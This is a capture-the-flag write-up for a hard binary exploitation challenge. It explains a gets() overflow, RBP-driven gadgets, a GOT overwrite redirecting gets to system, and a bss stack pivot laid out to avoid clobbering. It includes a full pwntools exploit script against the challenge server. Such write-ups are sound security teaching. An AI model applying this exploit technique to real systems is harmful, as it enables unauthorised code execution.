# CTF Writeup: Miller's Planet — PWN

**Category:** Binary Exploitation (PWN)  
**Difficulty:** Hard (Architectural Constraints & Stack Physics)  
**Flag:** `UVT{wh0_n33d5_10_stdfile_0_l0ck_wh3n_y0u_hav3_r0p_bWlsbGVyIHMgcGxhbmV0IGlzIGNyYXp5}`

---

## Introduction & The "AI Trap"

At first glance, this binary looks like a textbook buffer overflow. Feed it to an AI tool and it will confidently hallucinate a complex, fragile exploit path revolving around leftover libc pointers like `_IO_stdfile_0_lock`. The challenge author anticipated exactly this — the flag itself decodes to:

> *"who needs _IO_stdfile_0_lock when you have rop, miller's planet is crazy"*

The correct path requires ignoring that rabbit hole entirely and engineering a custom "Ascending-Data" ROP chain that accounts for Linux memory page boundaries and the destructive downward growth of the stack. This writeup documents every crash, every diagnosis, and every architectural decision that led to a working shell.

---

## Phase 0: Reconnaissance

Before touching any code, establish the rules of engagement.

```bash
$ checksec --file=miller_patched
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Breaking down what each protection means for this exploit:

**No PIE (off):** The binary is loaded at a fixed base address (`0x400000`) every single run. Every function, every gadget, every GOT entry has a static, hardcodeable address. No leak required.

**No Stack Canary (off):** No "tripwire" random value sits between the buffer and the saved return pointer. We can overflow freely without triggering a self-destruct mechanism.

**NX Enabled (on):** The stack is marked non-executable. We cannot inject raw shellcode and jump to it. We must use **Return-Oriented Programming (ROP)** — chaining together small snippets of existing executable code ("gadgets") to build our exploit logic.

**Partial RELRO:** The **Global Offset Table (GOT)** — the runtime lookup table that maps function names to their actual addresses in libc — is **writable**. This is the critical attack surface we will exploit.

Check which libc functions are imported and where their GOT entries live:

```bash
$ objdump -R miller_patched | grep "gets\|system"
0000000000405020 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
0000000000405008 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
```

Because PIE is off, `gets@got` is permanently at `0x405020`. This address will be the target of our GOT overwrite.

---

## Phase 1: The Vulnerability

Decompiling the binary in Ghidra reveals the core logic:

```c
void get_message() {
    int size;           // [rbp-0x114]
    char buffer[264];   // [rbp-0x110]

    puts("What size will have you re message");
    scanf("%d", &size);

    if (size <= 256) {
        puts("Enter you re message");
        gets(buffer);   // THE VULNERABILITY
    }
}
```

**The bug:** `scanf` reads a size and the code checks `if (size <= 256)` before proceeding. However, the actual read uses `gets(buffer)`, which is one of the most dangerous functions in the C standard library. `gets()` reads from stdin until it hits a newline — it **completely ignores** the buffer size. The `size` check is pure theater.

**Stack frame layout of `get_message()`:**

```
[ buffer[264]  ]  <- rbp - 0x110  (our controlled overflow starts here)
[   size(int)  ]  <- rbp - 0x114  (not useful)
[   padding    ]
[  Saved RBP   ]  <- rbp + 0x00   (8 bytes — controls the "workspace" illusion)
[  Saved RIP   ]  <- rbp + 0x08   (8 bytes — controls where execution jumps next)
```

By sending more than `264 + 8 = 272` bytes, we reach and overwrite:
- **Saved RBP** → we control where the CPU thinks the stack frame base is
- **Saved RIP** → we control where execution goes after the function returns

Overwriting RBP is not just a bonus — it is the **core primitive** of this entire exploit, because the only available gadgets are RBP-relative.

---

## Phase 2: The Gadget Hunt

In standard x86-64 Linux calling convention, the first argument to any function must be placed in the **RDI register** before the call. To call `system("/bin/sh")`, we need `RDI = address of "/bin/sh"`.

The standard gadget for this is `pop rdi; ret`. Running ROPgadget confirms it does not exist in this binary:

```bash
$ ROPgadget --binary miller_patched | grep "pop rdi"
# (no results)
```

Instead, examining the end of `get_message()` reveals two custom gadgets the author left in:

**Gadget 1 — `0x401450`:**
```asm
lea rax, [rbp - 0x110]
mov rdi, rax
call gets
```
This computes `RDI = RBP - 0x110`. Since we control RBP via the overflow, we control the exact address `gets()` will write to. This is a **write-where primitive**.

**Gadget 2 — `0x40141a`:**
```asm
mov rax, [rbp - 0x8]
mov rdi, rax
call gets
```
This dereferences `[RBP - 0x8]` and loads that value into RDI. Again, since we control RBP and the memory it points into (because we're operating in our fake stack), we control the argument.

> **The key insight:** Both gadgets delegate argument control to RBP. The buffer overflow gives us RBP. Therefore, we have arbitrary RDI control — we've assembled a `pop rdi` equivalent from scratch.

---

## Phase 3: The GOT Patch

The plan is to overwrite the GOT entry for `gets` with the address of `system`. After the patch, every future call to `gets()` in the binary will silently execute `system()` instead.

**Why this works:**

When C code calls `gets()`, it doesn't jump directly to libc. It jumps to the PLT (Procedure Linkage Table) stub, which reads the function's real address from the GOT and jumps there. With Partial RELRO, the GOT is writable — we can change what address it contains.

```
Before patch:
gets@got (0x405020) → 0x7f...gets_in_libc

After patch:
gets@got (0x405020) → 0x4010c0  (system@plt)
```

From that point on, any call to `gets(some_string)` becomes `system(some_string)`. If we ensure `some_string` is `"/bin/sh"`, we get a shell.

The patch is performed using Gadget 1 or 2 to call `gets(0x405020)`, then sending `p64(system_plt)` as the input that `gets()` writes into the GOT.

---

## Phase 4: Stack Physics & The Bulldozer

This is where the exploit repeatedly crashed during development. Understanding these crashes is the most educational part of the writeup.

### Crash 1: EOFError (Hardware Page Fault)

First attempt: pivot the stack to `0x40c000` (a "nice-looking" high address in `.bss`).

**Result:** Instant crash / `EOFError`.

**Why:** Linux manages memory in **4KB pages** (4096 bytes). The `.bss` section starts at `0x405050`. The OS maps one page: `0x405000` → `0x405FFF` as Read/Write. The address `0x40c000` is on a completely **unmapped page** — the CPU generates a hardware **Page Fault** when anything tries to read or write there, and the kernel kills the process.

**Fix:** Any pivot address must fall within the mapped page. We use `0x405600` as the base — solidly inside `0x405000`–`0x405FFF`.

---

### Crash 2: `sh: 1: Z@: not found` (Stack Clobbering)

Second attempt: pivot to `0x405600`, place `"/bin/sh"` at `0x405A00`, set RSP at `0x405A30`.

**Result:** Shell spawns but immediately dies with `sh: 1: Z@: not found`.

**Diagnosis with pwndbg:**

```bash
$ gdb ./miller_patched
pwndbg> b *0x40141a    # Gadget 2
pwndbg> b *0x4010c0    # system@plt
pwndbg> run < payload.bin
```

After the `system()` breakpoint, inspecting `0x405A00` shows the string `"/bin/sh"` has been **overwritten** with `0x405A40`, which in ASCII reads as `Z@`.

**Why — The Bulldozer Effect:**

The stack in x86-64 Linux grows **downward** (from high addresses toward low addresses). When `system()` executes, it needs a massive temporary workspace to load the shell environment variables, `PATH`, argument arrays, etc. It aggressively pushes data downward from RSP.

```
Memory Layout (Before system() runs):
0x405A30  ← RSP  (stack pointer, system() starts here)
0x405A00  ← "/bin/sh" string  (OUR DATA — directly in the bulldozer's path)
0x405600  ← Base

system() bulldozes downward from 0x405A30 → overwrites 0x405A00 with stack garbage.
"/bin/sh" becomes "Z@\x00..." → shell tries to run "Z@" → not found.
```

---

### The Fix: Ascending-Data Architecture

Since the stack only grows **downward**, anything placed **above RSP** is mathematically unreachable by the bulldozer.

The solution is to invert the layout:

```
0x405F50  ← "/bin/sh" string   (HIGH — invincible, bulldozer moves away from this)
0x405F00  ← Frame 2 (system call setup)
0x405E00  ← Frame 1 (gets(gets_got) setup)
0x405720  ← RSP anchor (LOW — bulldozer drives downward from here toward 0x405000)
```

The `system()` bulldozer starts at `0x405720` and drives toward `0x405000`. It has ~1.8KB of empty space to destroy — and it drives **completely away** from our critical data sitting high at `0x405F50`.

**Visual:**

```
HIGH MEMORY
  0x405FFF ┌─────────────────────────────┐
  0x405F50 │  "/bin/sh\x00"  ← SAFE      │  Bulldozer never reaches here
  0x405F00 │  Frame 2 (system args) ← SAFE│
  0x405E00 │  Frame 1 (got patch) ← SAFE  │
           │  ...empty space...           │
  0x405720 │  RSP anchor ← Stack starts   │  Bulldozer starts here
           │  ...empty page space...      │  ← Bulldozer destroys this (empty, fine)
  0x405000 └─────────────────────────────┘
LOW MEMORY
```

---

## The Final Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

# p = process('./miller_patched')
p = remote("194.102.62.166", 28141)

# Static addresses (No PIE — hardcoded forever)
gets_got   = 0x405020    # GOT entry we will overwrite
system_plt = 0x4010c0    # system@plt — what we overwrite it with
gadget1    = 0x401450    # lea rax, [rbp-0x110]; mov rdi, rax; call gets
gadget2    = 0x40141a    # mov rax, [rbp-0x8]; mov rdi, rax; call gets

# Goldilocks zone: inside the mapped 4KB .bss page (0x405000–0x405FFF)
BASE = 0x405600

log.info("Starting Ascending-Data exploit...")

# ==========================================
# PHASE 1: Initial overflow — pivot into BSS
# ==========================================
# 264-byte buffer + 8 bytes to reach Saved RBP = 272 bytes of padding
payload1  = b"A" * 272
payload1 += p64(BASE + 0x110)  # Overwrite Saved RBP → fake workspace base
payload1 += p64(gadget1)       # Overwrite Saved RIP → triggers gets(BASE)

p.sendlineafter(b"What size will have you re message\n", b"10")
p.sendlineafter(b"Enter you re message\n", payload1)
log.success("Phase 1: Pivoted into BSS. Executing gets(BASE).")
sleep(0.5)

# ==========================================
# PHASE 2: Build the ascending fake stack
# ==========================================
# We send a large blob that places all critical data HIGH in memory,
# far above where RSP will be anchored.
payload2 = bytearray(b"A" * 0x960)

# --- Transition frame ---
# After Phase 1's leave;ret, RSP = BASE + 0x118 = 0x405718
# Stack grows DOWN from here. Everything below 0x405718 is the bulldozer zone.
payload2[0x110:0x118] = p64(BASE + 0x800)  # Next RBP → 0x405E00
payload2[0x118:0x120] = p64(gadget2)       # Next RIP → Gadget 2

# --- Frame 1: gets(gets_got) ---
# Located at 0x405DF8 — well above the bulldozer zone. Invincible.
# Gadget 2 does: RDI = [RBP - 0x8] = [0x405E00 - 0x8] = [0x405DF8]
payload2[0x7F8:0x800] = p64(gets_got)      # [0x405DF8] = 0x405020 → RDI = gets_got
payload2[0x800:0x808] = p64(BASE + 0x900)  # Next RBP → 0x405F00
payload2[0x808:0x810] = p64(gadget2)       # Next RIP → Gadget 2 again

# --- Frame 2: system("/bin/sh") ---
# Located at 0x405EF8. Invincible.
# Gadget 2 does: RDI = [RBP - 0x8] = [0x405F00 - 0x8] = [0x405EF8]
payload2[0x8F8:0x900] = p64(BASE + 0x950)  # [0x405EF8] = 0x405F50 → RDI = &"/bin/sh"
payload2[0x900:0x908] = p64(0)             # Dummy final RBP

# --- The target string ---
# Placed at 0x405F50 — the highest point in our payload. Absolutely unreachable.
payload2[0x950:0x958] = b"/bin/sh\x00"

p.sendline(payload2)
log.success("Phase 2: Ascending stack planted. All critical data is clobber-proof.")
sleep(0.5)

# ==========================================
# PHASE 3: Surgical GOT patch
# ==========================================
# Gadget 2 is now executing gets(0x405020).
# We send exactly 24 bytes. The null byte appended by gets() lands safely on
# scanf@got, preserving all critical .data pointers.
payload3  = p64(system_plt)   # Overwrite gets@got with system@plt
payload3 += p64(0x401080)     # Restore malloc lazy stub
payload3 += p64(0x401090)     # Restore fflush lazy stub

p.sendline(payload3)
log.success("Phase 3: GOT patched. gets() is now system(). Triggering shell...")

p.interactive()
```

---

## Full Exploit Flow Diagram

```
[1] gets(buffer) overflow
        │
        ▼
[2] Overwrite RBP → BASE+0x110
    Overwrite RIP → gadget1
        │
        ▼ (gadget1 executes)
[3] RDI = RBP - 0x110 = BASE → gets(BASE)
    We send payload2 (the entire ascending fake stack)
        │
        ▼ (leave;ret — RSP moves to BASE+0x118)
[4] RBP = BASE+0x800 (0x405E00)
    RIP = gadget2
        │
        ▼ (gadget2 executes)
[5] RDI = [RBP - 0x8] = gets_got (0x405020) → gets(gets_got)
    We send payload3: p64(system_plt) + ...
        │
        ▼ (GOT patched — gets is now system)
[6] leave;ret → RBP = BASE+0x900, RIP = gadget2
        │
        ▼ (gadget2 executes)
[7] RDI = [RBP - 0x8] = BASE+0x950 → "system"("/bin/sh")
        │
        ▼
[8] SHELL
```

---

## Vulnerability Summary

| Step | Technique | Effect |
| :--- | :--- | :--- |
| `gets()` overflow | Stack Buffer Overflow | Overwrite Saved RBP and Saved RIP |
| RBP control | RBP-Relative Write Primitive | Forge arbitrary RDI via gadget math |
| Gadget 1 (`0x401450`) | Stack Pivot | Redirect execution into BSS workspace |
| Gadget 2 (`0x40141a`) | Fake Stack Chaining | Chain multiple controlled `gets()` calls |
| `gets(gets_got)` | GOT Overwrite | Replace `gets` pointer with `system` |
| Ascending-Data layout | Stack Physics Bypass | Place `/bin/sh` above RSP, immune to clobbering |
| `system("/bin/sh")` | Code Execution | Spawn shell |

---

## Key Concepts to Remember

**Why does controlling RBP give us RDI control?**
The only available gadgets compute RDI as a function of RBP (`lea rax, [rbp-0x110]` or `mov rax, [rbp-0x8]`). Since the buffer overflow lets us write an arbitrary value into the saved RBP slot on the stack, we control the math. No `pop rdi` needed — we reverse-engineered one from the available gadgets.

**Why is GOT overwriting more reliable than ret2libc here?**
ret2libc requires a libc leak to defeat ASLR. This binary has no useful output gadgets and no obvious leak path. The GOT is writable (Partial RELRO), `system@plt` is at a static address (no PIE), and `gets@got` is at a static address — making a direct GOT patch the cleanest one-shot solution.

**Why does the stack grow downward?**
This is a hardware design decision from the original x86 architecture. The stack pointer (RSP) decrements when you `push` data or when a function prologue reserves local space. `system()` internally calls `execve()` and builds argument arrays — it consumes a substantial amount of stack space downward from wherever RSP currently points.

**What is a 4KB page and why does it matter here?**
The OS kernel manages memory in fixed-size chunks called pages (4096 bytes on x86-64). Memory between pages is unmapped by default — any access triggers a hardware Page Fault (signal SIGSEGV). The `.bss` section occupies one page: `0x405000`–`0x405FFF`. Pivoting outside this range instantly kills the process. Always verify your pivot target is within a mapped region using `vmmap` in pwndbg.

**What is the "Ascending-Data" technique?**
A layout strategy where all data that must survive the exploit (strings, fake frames) is placed at higher memory addresses than the active stack pointer. Since the stack grows downward, `system()`'s internal writes always move away from these high-address anchors. It is the architecturally guaranteed solution to stack clobbering — not a hack, but a mathematical certainty.

**Why send `p64(0x401080)` and `p64(0x401090)` in Phase 3?**
The `gets()` write to the GOT overwrites exactly the bytes we send plus a null terminator. The null byte from `sendline` falls onto `scanf@got` — which is fine. However, if we send fewer bytes, subsequent entries (malloc stub, fflush stub) would be corrupted with garbage from the previous payload still in memory. Explicitly restoring them ensures no other GOT-dependent function breaks during the `system()` call.
